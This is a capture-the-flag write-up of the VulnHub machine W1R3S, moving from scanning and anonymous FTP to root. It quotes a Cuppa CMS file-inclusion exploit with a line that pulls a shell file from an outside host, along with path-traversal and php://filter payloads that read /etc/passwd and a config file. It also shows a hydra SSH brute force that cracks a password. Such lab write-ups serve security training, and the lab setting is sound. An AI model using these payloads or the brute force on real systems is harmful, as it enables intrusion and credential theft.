# W1R3S writeup

Lets start with network scan 
```bash
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                    
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.103   40:65:d4:5e:e0:3e      2     120  Unknown vendor                                                                                                                                                 
 192.168.0.106   00:0c:29:c5:03:f7      1      60  VMware, Inc.
```
\
NExt , Open ports 
```bash
Open 192.168.0.106:21
Open 192.168.0.106:80
Open 192.168.0.106:22
Open 192.168.0.106:3306
```
\
So lets try to login into ftp using anonymous
```bash
ftp 192.168.0.106
Connected to 192.168.0.106.
220 Welcome to W1R3S.inc FTP service.
Name (192.168.0.106:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||45349|)
150 Here comes the directory listing.
drwxr-xr-x    5 ftp      ftp          4096 Jan 23  2018 .
drwxr-xr-x    5 ftp      ftp          4096 Jan 23  2018 ..
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
226 Directory send OK.
```
\
Now i get all the files from the ftp server locally 
```bash
-rw-rw-r--  1 kali kali   29 Jan 23  2018  01.txt
-rw-rw-r--  1 kali kali  165 Jan 23  2018  02.txt
-rw-rw-r--  1 kali kali  582 Jan 23  2018  03.txt
-rw-rw-r--  1 kali kali  155 Jan 28  2018  employee-names.txt
-rw-rw-r--  1 kali kali  138 Jan 23  2018  worktodo.txt
```
\
```bash
cat employee-names.txt 
The W1R3S.inc employee list

Naomi.W - Manager
Hector.A - IT Dept
Joseph.G - Web Design
Albert.O - Web Design
Gina.L - Inventory
Rico.D - Human Resources

                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\w1r3s> cat worktodo.txt 
        ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡

....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ
                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\w1r3s> cat 01.txt      
New FTP Server For W1R3S.inc
                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\w1r3s> cat 02.txt 
#
#
#
#
#
#
#
#
01ec2d8fc11c493b25029fb1f47f39ce
#
#
#
#
#
#
#
#
#
#
#
#
#
SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==
############################################
                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\w1r3s> cat 03.txt 
___________.__              __      __  ______________________   _________    .__               
\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  
  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  < \_____  \     |  |/    \_/ ___\ 
  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___ 
  |____|   |___|  /\___  >   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  >
                \/     \/         \/                \/       \/        \/  \/         \/     \/ 
                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\w1r3s> echo "SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==" | base64 -d
It is easy, but not that easy..
```
\
Then i move on to PORT 80 , which just greets us with a defuault apache2 page, and using dirb gives
```bash
dirb http://192.168.0.106/    

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jan 23 01:53:16 2026
URL_BASE: http://192.168.0.106/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.106/ ----
==> DIRECTORY: http://192.168.0.106/administrator/                                                                                                                                                                
+ http://192.168.0.106/index.html (CODE:200|SIZE:11321)                                                                                                                                                           
==> DIRECTORY: http://192.168.0.106/javascript/                                                                                                                                                                   
+ http://192.168.0.106/server-status (CODE:403|SIZE:301)                                                                                                                                                          
==> DIRECTORY: http://192.168.0.106/wordpress/                                                                                                                                                                    
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.106/administrator/ ----
==> DIRECTORY: http://192.168.0.106/administrator/alerts/                                                                                                                                                         
==> DIRECTORY: http://192.168.0.106/administrator/api/                                                                                                                                                            
==> DIRECTORY: http://192.168.0.106/administrator/classes/                                                                                                                                                        
==> DIRECTORY: http://192.168.0.106/administrator/components/                                                                                                                                                     
==> DIRECTORY: http://192.168.0.106/administrator/extensions/                                                                                                                                                     
+ http://192.168.0.106/administrator/index.php (CODE:302|SIZE:6949)                                                                                                                                               
==> DIRECTORY: http://192.168.0.106/administrator/installation/                                                                                                                                                   
==> DIRECTORY: http://192.168.0.106/administrator/js/                                                                                                                                                             
==> DIRECTORY: http://192.168.0.106/administrator/language/                                                                                                                                                       
==> DIRECTORY: http://192.168.0.106/administrator/media/                                                                                                                                                          
^C> Testing: http://192.168.0.106/administrator/preload
```
\
So lets go to /administrator
\
<img width="1714" height="535" alt="image" src="https://github.com/user-attachments/assets/21b8ea41-501e-4d1d-813b-b55542db2367" />
\
We see that it is running cuppas CMS, so i check for any known vulns 
```bash
searchsploit cuppa                         
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                                                                                  | php/webapps/25971.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
\
Checking online gives
```bash
#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream 

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
-----------------------------------------------------------------------------
```
\
<img width="1211" height="378" alt="image" src="https://github.com/user-attachments/assets/d490085e-ea06-410e-afe4-edd301950989" />
\
From the /etc/passwd file , we see that there is a user 'w1r3s' and when i checked the ssh banner
```bash
ssh root@192.168.0.106                                       
----------------------
Think this is the way?
----------------------
Well,........possibly.
----------------------
```
\
This looks like a taunt, so lets try ssh bruteforce on it 
```bash
hydra -l w1r3s -P /usr/share/wordlists/rockyou.txt -t20 ssh://192.168.0.106 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-23 02:02:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 20 tasks per 1 server, overall 20 tasks, 14344399 login tries (l:1/p:14344399), ~717220 tries per task
[DATA] attacking ssh://192.168.0.106:22/
[22][ssh] host: 192.168.0.106   login: w1r3s   password: computer
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-23 02:02:35
```
\
So we found the right password , so lets login using ssh and check sudo permissions 
\
And We basically had access to own the system, so lets root it
```bash
id
uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
w1r3s@W1R3S:~$ sudo -l
sudo: unable to resolve host W1R3S
[sudo] password for w1r3s: 
Matching Defaults entries for w1r3s on W1R3S:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User w1r3s may run the following commands on W1R3S:
    (ALL : ALL) ALL
w1r3s@W1R3S:~$ sudo su
sudo: unable to resolve host W1R3S
root@W1R3S:/home/w1r3s# cd /root
root@W1R3S:~# ls -la
total 48
drwx------  6 root root 4096 Feb  4  2018 .
drwxr-xr-x 24 root root 4096 Mar  7  2018 ..
-rw-------  1 root root 7158 Feb  4  2018 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Jan 22  2018 .cache
-rw-r--r--  1 root root 2043 Feb  4  2018 flag.txt
drwx------  3 root root 4096 Jan 22  2018 .gnupg
-rw-------  1 root root 1118 Jan 28  2018 .mysql_history
drwxr-xr-x  2 root root 4096 Jan 22  2018 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Jan 22  2018 .ssh
root@W1R3S:~# cat flag.txt 
-----------------------------------------------------------------------------------------
   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  
  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___| 
 | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \ 
 | |__| |_| | |\  | |_| |  _ <  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |
  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/ 
                                                                                        
-----------------------------------------------------------------------------------------

                          .-----------------TTTT_-----_______
                        /''''''''''(______O] ----------____  \______/]_
     __...---'"""\_ --''   Q                               ___________@
 |'''                   ._   _______________=---------"""""""
 |                ..--''|   l L |_l   |
 |          ..--''      .  /-___j '   '
 |    ..--''           /  ,       '   '
 |--''                /           `    \
                      L__'         \    -
                                    -    '-.
                                     '.    /
                                       '-./

----------------------------------------------------------------------------------------
  YOU HAVE COMPLETED THE
               __      __  ______________________   _________
              /  \    /  \/_   \______   \_____  \ /   _____/
              \   \/\/   / |   ||       _/ _(__  < \_____  \ 
               \        /  |   ||    |   \/       \/        \
                \__/\  /   |___||____|_  /______  /_______  /.INC
                     \/                \/       \/        \/        CHALLENGE, V 1.0
----------------------------------------------------------------------------------------

CREATED BY SpecterWires

----------------------------------------------------------------------------------------
```
\
The End , thank you for reading till here
